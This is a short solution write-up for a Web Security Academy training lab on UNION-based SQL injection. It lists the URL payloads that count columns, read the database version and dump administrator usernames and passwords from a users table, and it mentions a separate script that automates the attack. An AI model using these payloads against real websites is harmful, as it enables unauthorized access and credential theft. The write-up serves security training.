# SQL Injection Lab 09 - SQL injection UNION attack, retrieving data from other tables

## Manual Solution

1. Access the lab in Web Security Academy
2. Determine the number of columns for UNION attack
   - Test: `/filter?category=Gifts' ORDER BY 1--`
   - Result: No error (at least 1 column exists)
   - Test: `/filter?category=Gifts' ORDER BY 2--`
   - Result: No error (at least 2 columns exist)
   - Test: `/filter?category=Gifts' ORDER BY 3--`
   - Result: Error (confirms 2 columns)

3. Determine the version of the database:
   - Test: `/filter?category=Gifts' UNION SELECT '1',version()--`
   - Result: So the version of the database is PostgreSQL 12.20

4. Username and password of the administrator:
   - Test: `/filter?category=Gifts' UNION SELECT username,password FROM users--`
   - Result: You'll see the username and password of the administrator.

5. Login to the administrator account

## Automated Solution

1. Download the script
2. Run the script with the following command: python sqli_lab_09.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)

